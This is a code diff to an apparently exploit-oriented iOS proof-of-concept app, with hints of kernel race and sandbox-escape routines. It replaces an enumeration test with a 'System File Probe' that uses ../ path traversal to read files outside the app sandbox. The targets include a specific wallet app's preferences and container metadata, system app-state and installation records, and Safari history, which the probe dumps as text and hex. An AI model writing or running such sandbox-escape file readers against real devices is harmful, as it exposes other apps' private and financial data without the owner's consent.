@@ -737,7 +737,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aiConf = [UIButtonConfiguration filledButtonConfiguration];
     aiConf.baseBackgroundColor = [UIColor systemPurpleColor];
     self.appIntentButton.configuration = aiConf;
-    [self.appIntentButton setTitle:@"Swift Bridge v37" forState:UIControlStateNormal];
+    [self.appIntentButton setTitle:@"System Files v38" forState:UIControlStateNormal];
     [self.appIntentButton addTarget:self action:@selector(appIntentTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.appIntentButton];
 
@@ -7302,56 +7302,102 @@ static void *iohid_threadCopyEvent(void *arg) {
 // Public PoC — if ObjC direct path traversal works, we can read any file
 // =======================================================================
 
-#pragma mark - App Intents Directory Enumeration (v34)
+#pragma mark - System File Probe (v38)
 
 - (void)appIntentTapped {
     [self appendLog:@"\n============================================================"];
-    [self appendLog:@"  App Intents Extension — Directory Enumeration Test"];
-    [self appendLog:@"  Hypothesis: App Intents XPC context has different MAC rules"];
+    [self appendLog:@"  v38 — Direct system file reads (known paths only)"];
     [self appendLog:@"============================================================\n"];
 
-    NSMutableString *log = [NSMutableString string];
-    NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        NSMutableString *log = [NSMutableString string];
+        NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
 
-#if HAS_SWIFT_APPINTENTS
-    [log appendString:@"[+] Swift AppIntents bridge available\n\n"];
-    SwordAppIntentBridge *bridge = [[SwordAppIntentBridge alloc] init];
+#define V38BASE @"../../../../../../../../../../../../../"
+#define V38FILE(path) [[V38BASE stringByAppendingString:path] stringByExpandingTildeInPath]
 
-    // Test 1: Enumerate TP cache dir via Swift
-    [log appendString:@"--- Swift Test 1: TP cache/global.wallet.ios ---\n"];
-    NSString *r1 = [bridge enumerateDirectory:
-        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Library/Caches/com.global.wallet.ios", tpUUID]];
-    [log appendString:r1];
+        void (^readFile)(NSString*, NSString*, NSMutableString*) =
+        ^(NSString *relPath, NSString *label, NSMutableString *out) {
+            NSString *full = V38FILE(relPath);
+            [out appendFormat:@"\n--- %@ ---\n  path: %@\n", label, full];
+            NSFileManager *fm = [NSFileManager defaultManager];
+            BOOL isDir = NO;
+            if (![fm fileExistsAtPath:full isDirectory:&isDir]) {
+                [out appendString:@"  NOT FOUND\n"];
+                return;
+            }
+            if (isDir) {
+                [out appendString:@"  is directory, skipping\n"];
+                return;
+            }
+            NSDictionary *attrs = [fm attributesOfItemAtPath:full error:nil];
+            unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
+            [out appendFormat:@"  size: %llu bytes\n", sz];
+            // plist parse
+            if ([relPath hasSuffix:@".plist"] || [relPath containsString:@"plist"]) {
+                NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:full];
+                if (d) {
+                    [out appendFormat:@"  keys: %@\n", [[d allKeys] componentsJoinedByString:@", "]];
+                    [out appendFormat:@"  dict: %@\n", d];
+                } else {
+                    // try reading as data
+                    NSData *data = [NSData dataWithContentsOfFile:full];
+                    [out appendFormat:@"  raw bytes: %lu\n", (unsigned long)data.length];
+                    [out appendFormat:@"  hex: %@\n", [[data subdataWithRange:NSMakeRange(0, MIN(128, data.length))] description]];
+                }
+            } else {
+                // plain text
+                NSError *err = nil;
+                NSString *txt = [NSString stringWithContentsOfFile:full encoding:NSUTF8StringEncoding error:&err];
+                if (txt) {
+                    [out appendFormat:@"  text (%lu chars):\n%@\n", (unsigned long)txt.length,
+                        [txt substringToIndex:MIN(2000, txt.length)]];
+                } else {
+                    NSData *data = [NSData dataWithContentsOfFile:full];
+                    [out appendFormat:@"  binary (%lu bytes), hex: %@\n", (unsigned long)data.length,
+                        [[data subdataWithRange:NSMakeRange(0, MIN(128, data.length))] description]];
+                }
+            }
+        };
 
-    // Test 2: Enumerate TP Documents/db dir
-    [log appendString:@"\n--- Swift Test 2: TP Documents/db ---\n"];
-    NSString *r2 = [bridge enumerateDirectory:
-        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Documents/db", tpUUID]];
-    [log appendString:r2];
+        // Test 1: TP's own preferences plist (standard iOS path)
+        readFile(@"var/mobile/Library/Preferences/com.global.wallet.ios.plist",
+                 @"TP Preferences plist", log);
 
-    // Test 3: Enumerate TP Documents/cache dir
-    [log appendString:@"\n--- Swift Test 3: TP Documents/cache ---\n"];
-    NSString *r3 = [bridge enumerateDirectory:
-        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Documents/cache", tpUUID]];
-    [log appendString:r3];
+        // Test 2: Container manager metadata for TP
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist", tpUUID],
+            @"TP Container Metadata", log);
 
-    // Test 4: Quick probe of few known paths
-    [log appendString:@"\n--- Swift Test 4: Quick probes ---\n"];
-    NSArray *probes = @[
-        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Documents/db/", tpUUID],
-        [NSString stringWithFormat:@"var/mobile/Containers/Data/Application/%@/Documents/cache/", tpUUID],
-    ];
-    for (NSString *p in probes) {
-        [log appendFormat:@"%@\n", [bridge probePath:p]];
-    }
+        // Test 3: FrontBoard app state (maps bundle IDs to UUIDs)
+        readFile(@"var/mobile/Library/FrontBoard/applicationState.plist",
+                 @"FrontBoard applicationState", log);
 
-#else
-    [log appendString:@"[-] Swift AppIntents bridge NOT available\n"];
-    [log appendString:@"    (UAFPoc-Swift.h not found — Swift not configured in build)\n"];
-    [log appendString:@"    This is expected if build.yml does not copy Swift files yet.\n"];
-#endif
+        // Test 4: Mobile Installation plist (app install records)
+        readFile(@"var/mobile/Library/Caches/com.apple.mobile.installation.plist",
+                 @"Mobile Installation Cache", log);
 
-    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+        // Test 5: Try alternate paths for MobileInstallation
+        readFile(@"var/installd/Library/MobileInstallation/LastBuildInfo.plist",
+                 @"installd LastBuildInfo", log);
+
+        // Test 6: Try the container manager db
+        readFile([NSString stringWithFormat:
+            @"var/mobile/Library/Caches/com.apple.containermanagerd/ClientState_%@" ,
+            tpUUID],
+            @"Container Manager ClientState", log);
+
+        // Test 7: Read TP's bundle Info.plist (need bundle UUID)
+        // First find bundle UUID from system paths
+        readFile(@"var/mobile/Library/Preferences/com.apple.mobileiTunes.plist",
+                 @"iTunes Store Preferences", log);
+
+        // Test 8: spotlight / core spotlight index segments
+        readFile(@"var/mobile/Library/Caches/com.apple.mobilesafari/SafariHistory.db",
+                 @"Safari History DB (baseline)", log);
+
+        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+    });
 }
 
 - (void)sandboxEscapeTapped {
